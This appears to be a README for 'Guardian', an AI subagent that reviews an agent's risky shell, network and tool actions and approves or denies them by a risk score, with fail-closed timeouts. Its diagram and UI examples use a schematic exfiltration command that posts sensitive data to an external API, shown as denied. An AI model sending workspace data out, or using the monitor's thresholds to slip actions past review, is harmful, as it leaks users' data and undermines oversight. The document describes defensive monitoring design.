# Guardian — Automated Risk Assessment System

Guardian — это подсистема автоматической проверки опасных действий AI-агента. Вместо запроса подтверждения у пользователя, Guardian самостоятельно оценивает риск и принимает решение.

## Overview

```
┌─────────────────────────────────────────────────────────────────┐
│                     MAIN AGENT                                   │
│                                                                 │
│  Command: curl -X POST sensitive_data → external.api           │
│                         ↓                                       │
│           ┌───────────────────────────────┐                     │
│           │  Approval Required (sandbox)  │                     │
│           └───────────────────────────────┘                     │
│                         ↓                                       │
│           routes_approval_to_guardian()?                        │
│                         ↓                                       │
│  ┌────────────────────────────────────────────────────────────┐ │
│  │              GUARDIAN SUBAGENT                             │ │
│  │                                                            │ │
│  │  ┌──────────────────────────────────────────────────────┐  │ │
│  │  │ Transcript: Conversation history                     │  │ │
│  │  │ Action: { "tool": "shell", "command": "curl..." }    │  │ │
│  │  │ Policy: Risk assessment guidelines                   │  │ │
│  │  └──────────────────────────────────────────────────────┘  │ │
│  │                         ↓                                   │ │
│  │            Risk Assessment Result                          │ │
│  │            risk_score: 95 (HIGH) → DENIED                 │ │
│  │                                                            │ │
│  └────────────────────────────────────────────────────────────┘ │
│                         ↓                                       │
│              ToolError::Rejected                               │
│                         ↓                                       │
│     User sees: ✗ Request denied (risk: high)                   │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

## When Guardian is Invoked

Guardian активируется **только** при одновременном выполнении двух условий:

| Condition                               | Config Field                | Description                            |
| --------------------------------------- | --------------------------- | -------------------------------------- |
| `approval_policy = OnRequest`           | `config.approval_policy`    | Model decides when to request approval |
| `approvals_reviewer = GuardianSubagent` | `config.approvals_reviewer` | Use Guardian instead of user           |

### Approval Policy Options

```rust
enum AskForApproval {
    Never,           // Auto-approve everything
    UnlessTrusted,   // Auto-approve "safe" commands, ask for others
    OnRequest,       // Model decides (routes to Guardian if reviewer=Guardian)
    Granular,        // Fine-grained controls
    OnFailure,       // Deprecated
}
```

### Approval Reviewer Options

```rust
enum ApprovalsReviewer {
    User,           // User makes the decision
    GuardianSubagent, // Guardian AI makes the decision
}
```

## Supported Request Types

Guardian can review the following types of actions:

| Type            | Description             | Data Included                                         |
| --------------- | ----------------------- | ----------------------------------------------------- |
| `Shell`         | Shell command execution | command, cwd, sandbox_permissions, justification      |
| `ExecCommand`   | Exec with TTY support   | command, cwd, sandbox_permissions, tty, justification |
| `Execve`        | Unix execve (Unix only) | program, argv, cwd                                    |
| `ApplyPatch`    | File patching           | files, change_count, patch                            |
| `NetworkAccess` | Network request         | target, host, protocol, port                          |
| `McpToolCall`   | MCP server tool call    | server, tool_name, arguments, annotations             |

## Risk Decision

| Risk Score      | Decision     | Action                    |
| --------------- | ------------ | ------------------------- |
| 0-79            | **Approved** | Command executes          |
| 80-100          | **Denied**   | Command blocked           |
| Timeout         | **Denied**   | Fail-closed (90s timeout) |
| Parse Error     | **Denied**   | Fail-closed               |
| External Cancel | **Abort**    | Waits for user            |

## Quick Navigation

- [Architecture](architecture.md) — System components and their relationships
- [Flow](flow.md) — Complete review lifecycle
- [Policy](policy.md) — Risk assessment guidelines (the actual policy Guardian uses)
- [API Reference](api.md) — Data structures and protocols
- [Implementation Guide](implementation-guide.md) — How to port to your application

## Key Constants

```rust
GUARDIAN_PREFERRED_MODEL     = "gpt-5.4"
GUARDIAN_REVIEW_TIMEOUT      = 90 seconds
GUARDIAN_APPROVAL_RISK_THRESHOLD = 80
GUARDIAN_MAX_MESSAGE_TRANSCRIPT_TOKENS = 10,000
GUARDIAN_MAX_TOOL_TRANSCRIPT_TOKENS    = 10,000
GUARDIAN_RECENT_ENTRY_LIMIT            = 40
```

## UI Feedback

### In Progress

```
Footer: "Reviewing approval request (5s)"
  └ • curl -X POST data → external.api
```

### Approved

```
✔ Auto-reviewer approved codex to run rm -f /tmp/test.db this time
```

### Denied

```
✗ Request denied for codex to run curl -X POST sensitive_data → external.api

⚠ Automatic approval review denied (risk: high): The planned action would
  transmit sensitive workspace data to an external and untrusted endpoint.
```
